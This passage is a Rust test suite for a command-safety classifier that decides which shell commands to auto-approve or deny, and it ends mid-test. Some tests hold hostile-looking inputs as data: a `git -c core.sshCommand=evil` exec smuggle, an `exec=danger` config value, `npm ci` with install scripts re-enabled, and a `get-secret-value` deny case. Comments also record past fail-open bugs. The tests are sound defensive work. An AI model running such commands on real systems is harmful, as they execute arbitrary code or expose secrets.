use super::*;
    use super::types::DispatchKind;
    use crate::parse::Token;
    use crate::verdict::{SafetyLevel, Verdict};

    fn toks(words: &[&str]) -> Vec<Token> {
        words.iter().map(|s| Token::from_test(s)).collect()
    }

    // Provenance + archetype validity are enforced at BUILD time (build::assert_sub_provenance),
    // reading the TOML — so the research is a validated part of the tree, and mis-authoring fails
    // CLOSED at registry load rather than silently under-recording. (This supersedes the earlier
    // runtime sweeps; every real command's subs pass this at load. The `should_panic`s below prove
    // each arm of the check fires; the positive case proves a well-formed profiled sub builds.)

    #[test]
    fn a_profiled_sub_with_full_provenance_builds() {
        let _ = load_one(
            r#"
            [[command]]
            name = "tc"
            [[command.sub]]
            name = "delete"
            profile = "remote-destroy-recoverable"
            fact = "Deletes the remote resource via the API."
            source = "https://example/docs"
            "#,
        );
    }

    #[test]
    #[should_panic(expected = "requires a `fact`")]
    fn a_profiled_sub_without_a_fact_panics_at_build() {
        load_one(
            "[[command]]\nname = \"tc\"\n[[command.sub]]\nname = \"delete\"\n\
             profile = \"remote-destroy-recoverable\"\nsource = \"https://example/docs\"\n",
        );
    }

    #[test]
    #[should_panic(expected = "is not a known archetype")]
    fn a_sub_with_an_unknown_profile_panics_at_build() {
        load_one(
            "[[command]]\nname = \"tc\"\n[[command.sub]]\nname = \"delete\"\n\
             profile = \"remote-destroy-typo\"\nfact = \"x\"\nsource = \"y\"\n",
        );
    }

    #[test]
    #[should_panic(expected = "AUTO-APPROVE")]
    fn a_candidate_shadowed_by_a_sibling_glob_panics_at_build() {
        // `get-secret-value` is candidate=true (meant to DENY) but matches the `get-*` glob → it
        // would fall through the candidate filter and auto-approve. The #4 footgun; must fail closed.
        load_one(
            "[[command]]\nname = \"tc\"\nfirst_arg = [\"get-*\", \"list-*\"]\n\
             [[command.sub]]\nname = \"get-secret-value\"\ncandidate = true\n",
        );
    }

    #[test]
    fn a_candidate_not_matching_the_glob_is_fine() {
        // A candidate whose name does NOT match the glob is safe — it denies as intended.
        load_one(
            "[[command]]\nname = \"tc\"\nfirst_arg = [\"describe-*\"]\n\
             [[command.sub]]\nname = \"delete-thing\"\ncandidate = true\n",
        );
    }

    #[test]
    #[should_panic(expected = "requires a `source`")]
    fn an_escalating_flag_without_a_source_panics_at_build() {
        load_one(
            "[[command]]\nname = \"tc\"\n[[command.sub]]\nname = \"push\"\n\
             profile = \"vcs-sync\"\nfact = \"x\"\nsource = \"y\"\n\
             [[command.sub.flag]]\nname = \"--force\"\n\
             classifies = \"remote-destroy-irreversible\"\nfact = \"z\"\n",
        );
    }

    /// The valued-flag-by-value escalator: a `value_prefix` flag escalates ONLY when its value
    /// matches — so one valued flag is benign for most values and dangerous for a specific key
    /// (the `git -c core.sshCommand=…` = exec pattern). A bare flag still escalates on presence.
    #[test]
    fn value_prefix_flags_escalate_only_on_a_matching_value() {
        use super::types::FlagProvenance;
        let c_flag = FlagProvenance {
            name: "-c".into(),
            classifies: "unclassified".into(),
            value_prefix: Some("core.sshCommand=".into()),
            when_absent: false,
        };
        let esc = |words: &[&str]| super::flag_escalates(&toks(words), &c_flag);
        assert!(esc(&["git", "-c", "core.sshCommand=evil", "push"]), "dangerous key → escalate");
        assert!(!esc(&["git", "-c", "color.ui=false", "log"]), "benign key → no escalate");
        assert!(!esc(&["git", "-c", "log"]), "flag without the matching value → no escalate");
        assert!(!esc(&["git", "push"]), "flag absent → no escalate");

        // glued `--flag=VALUE` form matches too
        let glued = FlagProvenance {
            name: "--conf".into(),
            classifies: "unclassified".into(),
            value_prefix: Some("exec=".into()),
            when_absent: false,
        };
        assert!(super::flag_escalates(&toks(&["x", "--conf=exec=danger"]), &glued));
        assert!(!super::flag_escalates(&toks(&["x", "--conf=safe=ok"]), &glued));

        // a bare flag (no value_prefix) still escalates on mere presence
        let bare = FlagProvenance {
            name: "--force".into(),
            classifies: "remote-destroy-irreversible".into(),
            value_prefix: None,
            when_absent: false,
        };
        assert!(super::flag_escalates(&toks(&["git", "push", "--force"]), &bare));
        assert!(!super::flag_escalates(&toks(&["git", "push"]), &bare));

        // `when_absent`: a SAFETY flag whose ABSENCE escalates (`npm ci` without `--ignore-scripts`).
        let safety = FlagProvenance {
            name: "--ignore-scripts".into(),
            classifies: "supply-chain-build".into(),
            value_prefix: None,
            when_absent: true,
        };
        assert!(super::flag_escalates(&toks(&["npm", "ci"]), &safety), "flag ABSENT → escalate");
        assert!(!super::flag_escalates(&toks(&["npm", "ci", "--ignore-scripts"]), &safety), "flag present → no escalate");
        // a re-enabling spelling must NOT masquerade as the safety flag (the fail-open the review found).
        assert!(super::flag_escalates(&toks(&["npm", "ci", "--ignore-scripts=false"]), &safety), "=false re-enables → escalate");
        assert!(super::flag_escalates(&toks(&["npm", "ci", "--ignore-scripts=0"]), &safety), "=0 re-enables → escalate");
        assert!(super::flag_escalates(&toks(&["npm", "ci", "--no-ignore-scripts"]), &safety), "--no- form → escalate");
        assert!(!super::flag_escalates(&toks(&["npm", "ci", "--ignore-scripts=true"]), &safety), "=true → no escalate");
    }

    /// Regression: a profiled sub must deny via the LEGACY path too, not just the engine. A global
    /// flag before the subcommand (`git -c … push`, `git -C … push`) makes the engine's sub walk stop
    /// early → it abstains → legacy dispatches the profiled sub, which MUST still deny (it's above the
    /// auto-approve line). Was a fail-open: `git -c color.ui=false push` auto-approved.
    #[test]
    fn a_profiled_sub_denies_via_legacy_when_the_engine_abstains() {
        for cmd in [
            "git -c color.ui=false push",
            "git -c color.ui=false push origin main",
            "git -C /tmp push",
        ] {
            assert_eq!(crate::command_verdict(cmd), Verdict::Denied, "{cmd} must deny via legacy");
        }
        // a read sub with a benign global flag still auto-approves — the fix is scoped to profiled subs
        assert!(crate::command_verdict("git -c color.ui=false log").is_allowed(), "reads unaffected");
    }

    fn load_one(toml_str: &str) -> CommandSpec {
        let mut specs = load_toml(toml_str, "test");
        assert_eq!(specs.len(), 1);
        specs.remove(0)
    }

    // ---------------------------------------------------------------
    // Flat commands
    // ---------------------------------------------------------------

    #[test]
    fn flat_bare_allowed() {
        let spec = load_one(r#"
            [[command]]
            name = "wc"
            bare = true
        "#);
        assert_eq!(dispatch_spec(&toks(&["wc"]), &spec), Verdict::Allowed(SafetyLevel::Inert));
    }

    #[test]
    fn flat_bare_denied_when_false() {
        let spec = load_one(r#"
            [[command]]
            name = "grep"
            bare = false
        "#);
        assert_eq!(dispatch_spec(&toks(&["grep"]), &spec), Verdict::Denied);
    }

    #[test]
    fn flat_standalone_flag() {
        let spec = load_one(r#"
            [[command]]
            name = "wc"
            bare = true
            standalone = ["-l", "--lines"]
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["wc", "-l", "file.txt"]), &spec),
            Verdict::Allowed(SafetyLevel::Inert),
        );
    }

    #[test]
    fn flat_unknown_flag_rejected() {
        let spec = load_one(r#"
            [[command]]
            name = "wc"
            standalone = ["-l"]
        "#);
        assert_eq!(dispatch_spec(&toks(&["wc", "--evil"]), &spec), Verdict::Denied);
    }

    #[test]
    fn flat_valued_flag_space() {
        let spec = load_one(r#"
            [[command]]
            name = "grep"
            bare = false
            valued = ["--max-count", "-m"]
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["grep", "--max-count", "5", "pattern"]), &spec),
            Verdict::Allowed(SafetyLevel::Inert),
        );
    }

    #[test]
    fn flat_valued_flag_eq() {
        let spec = load_one(r#"
            [[command]]
            name = "grep"
            bare = false
            valued = ["--max-count"]
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["grep", "--max-count=5", "pattern"]), &spec),
            Verdict::Allowed(SafetyLevel::Inert),
        );
    }

    #[test]
    fn flat_combined_short_flags() {
        let spec = load_one(r#"
            [[command]]
            name = "grep"
            bare = false
            standalone = ["-r", "-n", "-i"]
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["grep", "-rni", "pattern", "."]), &spec),
            Verdict::Allowed(SafetyLevel::Inert),
        );
    }

    #[test]
    fn flat_combined_short_unknown_rejected() {
        let spec = load_one(r#"
            [[command]]
            name = "grep"
            bare = false
            standalone = ["-r", "-n"]
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["grep", "-rnz", "pattern"]), &spec),
            Verdict::Denied,
        );
    }

    #[test]
    fn flat_combined_short_with_valued_last() {
        let spec = load_one(r#"
            [[command]]
            name = "grep"
            bare = false
            standalone = ["-r", "-n"]
            valued = ["-m"]
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["grep", "-rnm", "5", "pattern"]), &spec),
            Verdict::Allowed(SafetyLevel::Inert),
        );
    }

    #[test]
    fn flat_double_dash_stops_flag_checking() {
        let spec = load_one(r#"
            [[command]]
            name = "grep"
            bare = false
            standalone = ["-r"]
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["grep", "-r", "--", "--not-a-flag", "file"]), &spec),
            Verdict::Allowed(SafetyLevel::Inert),
        );
    }

    #[test]
    fn flat_max_positional_enforced() {
        let spec = load_one(r#"
            [[command]]
            name = "uniq"
            bare = true
            max_positional = 1
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["uniq", "a"]), &spec),
            Verdict::Allowed(SafetyLevel::Inert),
        );
        assert_eq!(
            dispatch_spec(&toks(&["uniq", "a", "b"]), &spec),
            Verdict::Denied,
        );
    }

    #[test]
    fn flat_max_positional_after_double_dash() {
        let spec = load_one(r#"
            [[command]]
            name = "uniq"
            bare = true
            max_positional = 1
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["uniq", "--", "a", "b"]), &spec),
            Verdict::Denied,
        );
    }

    #[test]
    fn flat_tolerate_unknown_long() {
        let spec = load_one(r#"
            [[command]]
            name = "echo"
            bare = true
            tolerate_unknown_long = true
            standalone = ["-n", "-e"]
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["echo", "--unknown", "hello"]), &spec),
            Verdict::Allowed(SafetyLevel::Inert),
        );
    }

    #[test]
    fn legacy_positional_style_panics() {
        let result = std::panic::catch_unwind(|| {
            load_one(r#"
                [[command]]
                name = "demo-legacy"
                bare = true
                positional_style = true
            "#);
        });
        assert!(result.is_err(),
            "loading positional_style = true should panic with migration guidance");
    }

    #[test]
    fn flat_level_safe_read() {
        let spec = load_one(r#"
            [[command]]
            name = "cargo"
            level = "SafeRead"
            bare = true
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["cargo"]), &spec),
            Verdict::Allowed(SafetyLevel::SafeRead),
        );
    }

    #[test]
    fn flat_level_safe_write() {
        let spec = load_one(r#"
            [[command]]
            name = "cargo"
            level = "SafeWrite"
            bare = true
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["cargo"]), &spec),
            Verdict::Allowed(SafetyLevel::SafeWrite),
        );
    }

    // ---------------------------------------------------------------
    // Structured commands with subcommands
    // ---------------------------------------------------------------

    #[test]
    fn structured_bare_rejected() {
        let spec = load_one(r#"
            [[command]]
            name = "cargo"
            bare_flags = ["--help"]

            [[command.sub]]
            name = "build"
            level = "SafeWrite"
        "#);
        assert_eq!(dispatch_spec(&toks(&["cargo"]), &spec), Verdict::Denied);
    }

    #[test]
    fn structured_bare_flag() {
        let spec = load_one(r#"
            [[command]]
            name = "cargo"
            bare_flags = ["--help", "-h"]

            [[command.sub]]
            name = "build"
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["cargo", "--help"]), &spec),
            Verdict::Allowed(SafetyLevel::Inert),
        );
    }

    #[test]
    fn structured_bare_flag_with_extra_rejected() {
        let spec = load_one(r#"
            [[command]]
            name = "cargo"
            bare_flags = ["--help"]

            [[command.sub]]
            name = "build"
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["cargo", "--help", "extra"]), &spec),
            Verdict::Denied,
        );
    }

    #[test]
    fn structured_help_denied_when_not_in_bare_flags() {
        let spec = load_one(r#"
            [[command]]
            name = "tea"
            bare_flags = ["--version", "-v"]

            [[command.sub]]
            name = "whoami"
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["tea", "--help"]), &spec),
            Verdict::Denied,
        );
        assert_eq!(
            dispatch_spec(&toks(&["tea", "-h"]), &spec),
            Verdict::Denied,
        );
    }

    #[test]
    fn structured_help_allowed_when_in_bare_flags() {
        let spec = load_one(r#"
            [[command]]
            name = "cargo"
            bare_flags = ["--help", "-h"]

            [[command.sub]]
            name = "build"
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["cargo", "--help"]), &spec),
            Verdict::Allowed(SafetyLevel::Inert),
        );
        assert_eq!(
            dispatch_spec(&toks(&["cargo", "-h"]), &spec),
            Verdict::Allowed(SafetyLevel::Inert),
        );
    }

    #[test]
    fn nested_help_allowed_without_bare_flags() {
        let spec = load_one(r#"
            [[command]]
            name = "tool"

            [[command.sub]]
            name = "config"

            [[command.sub.sub]]
            name = "get"
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["tool", "config", "--help"]), &spec),
            Verdict::Allowed(SafetyLevel::Inert),
        );
        assert_eq!(
            dispatch_spec(&toks(&["tool", "config", "-h"]), &spec),
            Verdict::Allowed(SafetyLevel::Inert),
        );
    }

    #[test]
    fn nested_help_with_trailing_denied() {
        let spec = load_one(r#"
            [[command]]
            name = "tool"

            [[command.sub]]
            name = "config"

            [[command.sub.sub]]
            name = "get"
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["tool", "config", "--help", "extra"]), &spec),
            Verdict::Denied,
        );
    }

    #[test]
    fn structured_unknown_sub_rejected() {
        let spec = load_one(r#"
            [[command]]
            name = "cargo"

            [[command.sub]]
            name = "build"
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["cargo", "deploy"]), &spec),
            Verdict::Denied,
        );
    }

    #[test]
    fn structured_sub_policy() {
        let spec = load_one(r#"
            [[command]]
            name = "cargo"

            [[command.sub]]
            name = "test"
            level = "SafeRead"
            standalone = ["--release", "-h"]
            valued = ["--jobs", "-j"]
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["cargo", "test", "--release", "-j", "4"]), &spec),
            Verdict::Allowed(SafetyLevel::SafeRead),
        );
    }

    #[test]
    fn structured_sub_unknown_flag_rejected() {
        let spec = load_one(r#"
            [[command]]
            name = "cargo"

            [[command.sub]]
            name = "test"
            standalone = ["--release"]
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["cargo", "test", "--evil"]), &spec),
            Verdict::Denied,
        );
    }

    // ---------------------------------------------------------------
    // Guarded subcommands
    // ---------------------------------------------------------------

    #[test]
    fn guarded_with_guard() {
        let spec = load_one(r#"
            [[command]]
            name = "cargo"

            [[command.sub]]
            name = "fmt"
            guard = "--check"
            standalone = ["--all", "--check", "-h"]
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["cargo", "fmt", "--check"]), &spec),
            Verdict::Allowed(SafetyLevel::Inert),
        );
    }

    #[test]
    fn guarded_without_guard_rejected() {
        let spec = load_one(r#"
            [[command]]
            name = "cargo"

            [[command.sub]]
            name = "fmt"
            guard = "--check"
            standalone = ["--all", "--check"]
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["cargo", "fmt"]), &spec),
            Verdict::Denied,
        );
    }

    #[test]
    fn guarded_with_short_form() {
        let spec = load_one(r#"
            [[command]]
            name = "cargo"

            [[command.sub]]
            name = "package"
            guard = "--list"
            guard_short = "-l"
            standalone = ["--list", "-l"]
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["cargo", "package", "-l"]), &spec),
            Verdict::Allowed(SafetyLevel::Inert),
        );
    }

    #[test]
    fn guarded_with_eq_syntax() {
        let spec = load_one(r#"
            [[command]]
            name = "tool"

            [[command.sub]]
            name = "sub"
            guard = "--mode"
            valued = ["--mode"]
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["tool", "sub", "--mode=check"]), &spec),
            Verdict::Allowed(SafetyLevel::Inert),
        );
    }

    #[test]
    fn guarded_short_eq_does_not_satisfy_guard() {
        let spec = load_one(r#"
            [[command]]
            name = "cargo"

            [[command.sub]]
            name = "package"
            guard = "--list"
            guard_short = "-l"
            standalone = ["--list", "-l"]
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["cargo", "package", "-l=foo"]), &spec),
            Verdict::Denied,
        );
    }

    #[test]
    fn guarded_long_eq_satisfies_guard() {
        let spec = load_one(r#"
            [[command]]
            name = "cargo"

            [[command.sub]]
            name = "package"
            guard = "--list"
            guard_short = "-l"
            valued = ["--list"]
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["cargo", "package", "--list=all"]), &spec),
            Verdict::Allowed(SafetyLevel::Inert),
        );
    }

    #[test]
    fn guarded_help_positional_allowed() {
        let spec = load_one(r#"
            [[command]]
            name = "cargo"

            [[command.sub]]
            name = "fmt"
            guard = "--check"
            standalone = ["--all", "--check"]
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["cargo", "fmt", "--help"]), &spec),
            Verdict::Allowed(SafetyLevel::Inert),
        );
        assert_eq!(
            dispatch_spec(&toks(&["cargo", "fmt", "-h"]), &spec),
            Verdict::Allowed(SafetyLevel::Inert),
        );
        assert_eq!(
            dispatch_spec(&toks(&["cargo", "fmt", "help"]), &spec),
            Verdict::Allowed(SafetyLevel::Inert),
        );
    }

    // ---------------------------------------------------------------
    // Nested subcommands
    // ---------------------------------------------------------------

    #[test]
    fn nested_sub() {
        let spec = load_one(r#"
            [[command]]
            name = "mise"

            [[command.sub]]
            name = "config"

            [[command.sub.sub]]
            name = "get"
            standalone = ["--help", "-h"]

            [[command.sub.sub]]
            name = "list"
            standalone = ["--help", "-h"]
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["mise", "config", "get"]), &spec),
            Verdict::Allowed(SafetyLevel::Inert),
        );
        assert_eq!(
            dispatch_spec(&toks(&["mise", "config", "delete"]), &spec),
            Verdict::Denied,
        );
    }

    #[test]
    fn nested_bare_rejected() {
        let spec = load_one(r#"
            [[command]]
            name = "mise"

            [[command.sub]]
            name = "config"

            [[command.sub.sub]]
            name = "get"
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["mise", "config"]), &spec),
            Verdict::Denied,
        );
    }

    // ---------------------------------------------------------------
    // Nested with nested_bare = true
    // ---------------------------------------------------------------

    #[test]
    fn nested_bare_allowed_when_flag_set() {
        let spec = load_one(r#"
            [[command]]
            name = "mise"

            [[command.sub]]
            name = "settings"
            nested_bare = true

            [[command.sub.sub]]
            name = "get"
            standalone = ["--help", "-h", "-q", "-v"]

            [[command.sub.sub]]
            name = "list"
            standalone = ["--help", "-h", "-q", "-v"]
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["mise", "settings"]), &spec),
            Verdict::Allowed(SafetyLevel::Inert),
        );
    }

    #[test]
    fn nested_bare_help_allowed() {
        let spec = load_one(r#"
            [[command]]
            name = "mise"

            [[command.sub]]
            name = "settings"
            nested_bare = true

            [[command.sub.sub]]
            name = "get"
            standalone = ["--help", "-h"]
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["mise", "settings", "--help"]), &spec),
            Verdict::Allowed(SafetyLevel::Inert),
        );
        assert_eq!(
            dispatch_spec(&toks(&["mise", "settings", "-h"]), &spec),
            Verdict::Allowed(SafetyLevel::Inert),
        );
    }

    #[test]
    fn nested_bare_still_dispatches_to_subs() {
        let spec = load_one(r#"
            [[command]]
            name = "mise"

            [[command.sub]]
            name = "settings"
            nested_bare = true

            [[command.sub.sub]]
            name = "get"
            standalone = ["--help", "-h", "-q", "-v"]

            [[command.sub.sub]]
            name = "list"
            standalone = ["--help", "-h", "-q", "-v"]
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["mise", "settings", "get"]), &spec),
            Verdict::Allowed(SafetyLevel::Inert),
        );
        assert_eq!(
            dispatch_spec(&toks(&["mise", "settings", "list"]), &spec),
            Verdict::Allowed(SafetyLevel::Inert),
        );
        assert_eq!(
            dispatch_spec(&toks(&["mise", "settings", "get", "-q"]), &spec),
            Verdict::Allowed(SafetyLevel::Inert),
        );
    }

    #[test]
    fn nested_bare_rejects_unknown_sub() {
        let spec = load_one(r#"
            [[command]]
            name = "mise"

            [[command.sub]]
            name = "settings"
            nested_bare = true

            [[command.sub.sub]]
            name = "get"
            standalone = ["--help", "-h"]
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["mise", "settings", "set"]), &spec),
            Verdict::Denied,
        );
        assert_eq!(
            dispatch_spec(&toks(&["mise", "settings", "delete"]), &spec),
            Verdict::Denied,
        );
    }

    #[test]
    fn nested_bare_rejects_unknown_flags() {
        let spec = load_one(r#"
            [[command]]
            name = "mise"

            [[command.sub]]
            name = "settings"
            nested_bare = true

            [[command.sub.sub]]
            name = "get"
            standalone = ["--help", "-h"]
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["mise", "settings", "--evil"]), &spec),
            Verdict::Denied,
        );
    }

    #[test]
    fn nested_bare_false_is_default() {
        let spec = load_one(r#"
            [[command]]
            name = "npm"

            [[command.sub]]
            name = "config"

            [[command.sub.sub]]
            name = "get"
            standalone = ["--help", "-h"]
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["npm", "config"]), &spec),
            Verdict::Denied,
        );
    }

    // ---------------------------------------------------------------
    // AllowAll
    // ---------------------------------------------------------------

    #[test]
    fn allow_all_accepts_anything() {
        let spec = load_one(r#"
            [[command]]
            name = "git"

            [[command.sub]]
            name = "help"
            allow_all = true
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["git", "help"]), &spec),
            Verdict::Allowed(SafetyLevel::Inert),
        );
        assert_eq!(
            dispatch_spec(&toks(&["git", "help", "commit", "--verbose"]), &spec),
            Verdict::Allowed(SafetyLevel::Inert),
        );
    }

    // ---------------------------------------------------------------
    // FirstArgFilter (first_arg field)
    // ---------------------------------------------------------------

    #[test]
    fn first_arg_exact_match() {
        let spec = load_one(r#"
            [[command]]
            name = "npm"
            bare_flags = ["--help", "--version", "-V", "-h"]

            [[command.sub]]
            name = "run"
            first_arg = ["test"]
            level = "SafeRead"
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["npm", "run", "test"]), &spec),
            Verdict::Allowed(SafetyLevel::SafeRead),
        );
    }

    #[test]
    fn first_arg_glob_match() {
        let spec = load_one(r#"
            [[command]]
            name = "npm"

            [[command.sub]]
            name = "run"
            first_arg = ["test", "test:*"]
            level = "SafeRead"
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["npm", "run", "test:unit"]), &spec),
            Verdict::Allowed(SafetyLevel::SafeRead),
        );
        assert_eq!(
            dispatch_spec(&toks(&["npm", "run", "test:integration"]), &spec),
            Verdict::Allowed(SafetyLevel::SafeRead),
        );
    }

    #[test]
    fn first_arg_rejects_non_matching() {
        let spec = load_one(r#"
            [[command]]
            name = "npm"

            [[command.sub]]
            name = "run"
            first_arg = ["test", "test:*"]
            level = "SafeRead"
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["npm", "run", "build"]), &spec),
            Verdict::Denied,
        );
        assert_eq!(
            dispatch_spec(&toks(&["npm", "run", "start"]), &spec),
            Verdict::Denied,
        );
    }

    #[test]
    fn first_arg_rejects_bare() {
        let spec = load_one(r#"
            [[command]]
            name = "npm"

            [[command.sub]]
            name = "run"
            first_arg = ["test"]
            level = "SafeRead"
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["npm", "run"]), &spec),
            Verdict::Denied,
        );
    }

    #[test]
    fn first_arg_allows_help() {
        let spec = load_one(r#"
            [[command]]
            name = "npm"

            [[command.sub]]
            name = "run"
            first_arg = ["test"]
            level = "SafeRead"
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["npm", "run", "--help"]), &spec),
            Verdict::Allowed(SafetyLevel::Inert),
        );
        assert_eq!(
            dispatch_spec(&toks(&["npm", "run", "-h"]), &spec),
            Verdict::Allowed(SafetyLevel::Inert),
        );
    }

    #[test]
    fn first_arg_glob_does_not_match_partial() {
        let spec = load_one(r#"
            [[command]]
            name = "npm"

            [[command.sub]]
            name = "run"
            first_arg = ["test:*"]
            level = "SafeRead"
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["npm", "run", "test"]), &spec),
            Verdict::Denied,
        );
        assert_eq!(
            dispatch_spec(&toks(&["npm", "run", "testing"]), &spec),
            Verdict::Denied,
        );
    }

    // ---------------------------------------------------------------
    // RequireAny
    // ---------------------------------------------------------------

    #[test]
    fn require_any_with_required_flag() {
        let spec = load_one(r#"
            [[command]]
            name = "conda"
            bare_flags = ["--help", "--version", "-V", "-h"]

            [[command.sub]]
            name = "config"
            bare = false
            require_any = ["--show", "--show-sources"]
            standalone = ["--help", "--json", "--quiet", "--show", "--show-sources", "--verbose", "-h", "-q", "-v"]
            valued = ["--env", "--file", "--name", "--prefix", "-f", "-n", "-p"]
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["conda", "config", "--show"]), &spec),
            Verdict::Allowed(SafetyLevel::Inert),
        );
        assert_eq!(
            dispatch_spec(&toks(&["conda", "config", "--show-sources"]), &spec),
            Verdict::Allowed(SafetyLevel::Inert),
        );
        assert_eq!(
            dispatch_spec(&toks(&["conda", "config", "--show", "--json"]), &spec),
            Verdict::Allowed(SafetyLevel::Inert),
        );
    }

    #[test]
    fn require_any_without_required_flag() {
        let spec = load_one(r#"
            [[command]]
            name = "conda"

            [[command.sub]]
            name = "config"
            bare = false
            require_any = ["--show", "--show-sources"]
            standalone = ["--help", "--json", "--show", "--show-sources", "-h"]
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["conda", "config", "--json"]), &spec),
            Verdict::Denied,
        );
        assert_eq!(
            dispatch_spec(&toks(&["conda", "config"]), &spec),
            Verdict::Denied,
        );
    }

    #[test]
    fn require_any_allows_help() {
        let spec = load_one(r#"
            [[command]]
            name = "conda"

            [[command.sub]]
            name = "config"
            bare = false
            require_any = ["--show"]
            standalone = ["--help", "--show", "-h"]
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["conda", "config", "--help"]), &spec),
            Verdict::Allowed(SafetyLevel::Inert),
        );
        assert_eq!(
            dispatch_spec(&toks(&["conda", "config", "-h"]), &spec),
            Verdict::Allowed(SafetyLevel::Inert),
        );
    }

    #[test]
    fn require_any_rejects_unknown_flags() {
        let spec = load_one(r#"
            [[command]]
            name = "conda"

            [[command.sub]]
            name = "config"
            bare = false
            require_any = ["--show"]
            standalone = ["--help", "--show", "-h"]
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["conda", "config", "--show", "--evil"]), &spec),
            Verdict::Denied,
        );
    }

    #[test]
    fn require_any_with_eq_syntax() {
        let spec = load_one(r#"
            [[command]]
            name = "tool"

            [[command.sub]]
            name = "sub"
            bare = false
            require_any = ["--mode"]
            standalone = ["--help"]
            valued = ["--mode"]
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["tool", "sub", "--mode=check"]), &spec),
            Verdict::Allowed(SafetyLevel::Inert),
        );
    }

    #[test]
    fn require_any_rejects_unlisted_extra_flags() {
        let spec = load_one(r#"
            [[command]]
            name = "conda"

            [[command.sub]]
            name = "config"
            bare = false
            require_any = ["--show", "--show-sources"]
            standalone = ["--help", "--show", "--show-sources", "-h"]
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["conda", "config", "--show", "--set"]), &spec),
            Verdict::Denied,
        );
    }

    #[test]
    fn require_any_short_eq_does_not_satisfy() {
        let spec = load_one(r#"
            [[command]]
            name = "tool"

            [[command.sub]]
            name = "sub"
            bare = false
            require_any = ["--show", "-s"]
            standalone = ["--help", "--show", "-h", "-s"]
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["tool", "sub", "-s=foo"]), &spec),
            Verdict::Denied,
        );
    }

    #[test]
    fn require_any_short_in_combined_satisfies() {
        let spec = load_one(r#"
            [[command]]
            name = "tool"
            bare = false
            require_any = ["-z"]
            standalone = ["-z", "-v", "-n", "-h", "--help"]
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["tool", "-zv", "host", "80"]), &spec),
            Verdict::Allowed(SafetyLevel::Inert),
        );
        assert_eq!(
            dispatch_spec(&toks(&["tool", "-nvz", "host", "80"]), &spec),
            Verdict::Allowed(SafetyLevel::Inert),
        );
        assert_eq!(
            dispatch_spec(&toks(&["tool", "-nv", "host", "80"]), &spec),
            Verdict::Denied,
        );
    }

    #[test]
    fn require_any_long_eq_satisfies() {
        let spec = load_one(r#"
            [[command]]
            name = "tool"

            [[command.sub]]
            name = "sub"
            bare = false
            require_any = ["--show", "-s"]
            valued = ["--show"]
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["tool", "sub", "--show=all"]), &spec),
            Verdict::Allowed(SafetyLevel::Inert),
        );
    }

    #[test]
    fn require_any_does_not_accept_bare_help() {
        let spec = load_one(r#"
            [[command]]
            name = "tool"

            [[command.sub]]
            name = "sub"
            bare = false
            require_any = ["--show"]
            standalone = ["--help", "--show", "-h"]
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["tool", "sub", "--help"]), &spec),
            Verdict::Allowed(SafetyLevel::Inert),
        );
        assert_eq!(
            dispatch_spec(&toks(&["tool", "sub", "-h"]), &spec),
            Verdict::Allowed(SafetyLevel::Inert),
        );
        assert_eq!(
            dispatch_spec(&toks(&["tool", "sub", "help"]), &spec),
            Verdict::Denied,
        );
    }

    // ---------------------------------------------------------------
    // WriteFlagged
    // ---------------------------------------------------------------

    #[test]
    fn write_flagged_base_level() {
        let spec = load_one(r#"
            [[command]]
            name = "sk"

            [[command.sub]]
            name = "run"
            write_flags = ["--history"]
            standalone = ["--help", "-h"]
            valued = ["--history", "--query", "-q"]
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["sk", "run", "-q", "test"]), &spec),
            Verdict::Allowed(SafetyLevel::Inert),
        );
    }

    #[test]
    fn write_flagged_with_write_flag() {
        let spec = load_one(r#"
            [[command]]
            name = "sk"

            [[command.sub]]
            name = "run"
            write_flags = ["--history"]
            standalone = ["--help"]
            valued = ["--history", "--query"]
        "#);
        assert_eq!(
